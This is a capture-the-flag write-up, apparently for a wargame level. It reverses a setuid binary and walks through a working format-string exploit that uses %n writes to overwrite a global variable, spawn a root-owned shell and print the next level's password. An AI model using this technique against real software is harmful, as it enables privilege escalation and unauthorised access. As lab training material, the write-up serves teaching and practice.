```bash
$ ls -la
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3

$ file level3
level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
```

Reversed in c:
```c
int m = 0;

int v(void)
{
    int result;
    char s[520];

    fgets(s, 512, stdin);
    printf(s);
    result = m;
    if (m == 64)
    {
        fwrite("Wait what?!\n", 1u, 0xCu, stdout);
        return system("/bin/sh");
    }
    return result;
}

int main(void)
{
    return v();
}
```

This is a basic `printf()` format vulnarability
Here the user input is directly gived to `printf()`, allowing us to run formated string on it (`%p` `%s` `%n`) for exemple

First we need to find m:
```bash
level3@RainFall:~$ gdb level3
(gdb) info address m
Symbol "m" is at 0x804988c in a file compiled without debugging.
```

After we need to find where we are on the stack:
```bash
level3@RainFall:~$ echo "AAAA %x %x %x %x %x %x %x" > /tmp/payload_3
level3@RainFall:~$ cat /tmp/payload_3 | ./level3 
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```
the start of the array is the 4 value printed
lets try to use this to change the value of m:
```bash
echo -ne "\x8c\x98\x04\x08" > /tmp/payload_3
echo -ne "test%4\$n" >> /tmp/payload_3
gdb level3
b *0x80484da
run params ... < /tmp/payload_3
p m
$1 = 8
```

We can see that we have changed the value of `m` at `8`
Now this is strait forward, we gonna add as many character we need to have 64 as value

```bash
rm -f /tmp/payload_3
echo -ne "\x8c\x98\x04\x08" > /tmp/payload_3 # 4 character for the address of m
echo -ne "%60d" >> /tmp/payload_3 # pad 60 character
echo -ne "%4\$n" >> /tmp/payload_3 # we use %n to set the value of m
```

we run it:
```bash
level3@RainFall:~$ cat /tmp/payload_3 - | ./level3 

ï¿½AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!

cat /home/user/level4/.pass                
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```